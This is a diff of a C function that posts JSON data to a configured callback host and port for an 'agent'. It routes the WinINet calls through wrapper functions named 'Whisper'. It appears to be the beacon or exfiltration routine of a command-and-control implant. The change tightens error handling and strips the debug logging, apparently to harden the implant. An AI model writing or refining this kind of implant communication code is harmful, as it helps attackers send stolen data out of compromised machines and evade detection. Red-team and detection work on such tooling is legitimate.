@@ -38,70 +38,58 @@ wchar_t *char_to_wchar(const char *str)
 // =======================
 // HTTP POST Request
 // =======================
-int post_data(const char *json_data, char *agent_id)
+int post_data(const char *json_data, const char *agent_id)
 {
+    if (!json_data || !agent_id)
+        return 1;
     HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet)
-    {
-        DEBUG_LOGF(stderr, "InternetOpen failed: %lu\n", GetLastError());
         return 1;
-    }
 
-    // Connect to the server
-    HINTERNET hConnect = WhisperInternetConnectA(hInternet, CALLBACK_HTTP_HOST, CALLBACK_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hConnect = WhisperInternetConnectA(hInternet,
+                                                 CALLBACK_HTTP_HOST,
+                                                 CALLBACK_HTTP_PORT,
+                                                 NULL, NULL, INTERNET_SERVICE_HTTP,
+                                                 0, 0);
     if (!hConnect)
     {
-        DEBUG_LOGF(stderr, "InternetConnect failed: %lu\n", GetLastError());
-        InternetCloseHandle(hInternet);
+        WhisperInternetCloseHandle(hInternet);
         return 1;
     }
 
-    // Correctly formatted URL path (only relative path)
     char url[150];
-    snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, agent_id); // Only the relative path, not full URL
-
-    // Accept types (NULL means accept anything)
-    LPCSTR acceptTypes[] = {"*/*", NULL};
-
-    // Open the request
-    HINTERNET hRequest = WhisperHttpOpenRequestA(
-        hConnect,
-        "POST",                                              // HTTP method
-        url,                                                 // Relative path
-        NULL,                                                // Use default HTTP version
-        NULL,                                                // No referrer
-        acceptTypes,                                         // Accept all MIME types
-        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, // Flags
-        0                                                    // No context
-    );
-
-    if (!hRequest)
+    if (snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, agent_id) >= sizeof(url))
     {
-        DEBUG_LOGF(stderr, "HttpOpenRequest failed: %lu\n", GetLastError());
         WhisperInternetCloseHandle(hConnect);
         WhisperInternetCloseHandle(hInternet);
         return 1;
     }
 
-    // Headers
+    LPCSTR acceptTypes[] = {"*/*", NULL};
+    HINTERNET hRequest = WhisperHttpOpenRequestA(
+        hConnect, "POST", url, NULL, NULL, acceptTypes,
+        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
+    /*
+    : INTERNET_FLAG_RELOAD: Forces bypass of cache, so no caching responses
+    : INTERNET_FLAG_NO_CACHE_WRITE: Does not cache the request
+    */
+    if (!hRequest)
+    {
+        WhisperInternetCloseHandle(hConnect);
+        WhisperInternetCloseHandle(hInternet);
+        return 1;
+    }
+
     const char *headers = "Content-Type: application/json\r\n";
-
-    // Send the request
-    // DEBUG_LOG("UNRESOLVED CALL HttpSendRequestA HERE");
-    if (!WhisperHttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)json_data, strlen(json_data)))
-    {
-        DEBUG_LOGF(stderr, "HttpSendRequest failed: %lu\n", GetLastError());
-    }
-    else
-    {
-        DEBUG_LOG("POST request sent successfully.\n");
-    }
-
-    // Cleanup
+    BOOL successful_request = WhisperHttpSendRequestA(hRequest,
+                                                      headers, (DWORD)strlen(headers),
+                                                      (LPVOID)json_data, (DWORD)strlen(json_data));
     WhisperInternetCloseHandle(hRequest);
     WhisperInternetCloseHandle(hConnect);
     WhisperInternetCloseHandle(hInternet);
-    return 0;
+
+    // terniary:if successful request, 0, else 1
+    return successful_request ? 0 : 1;
 }
 
 // =======================
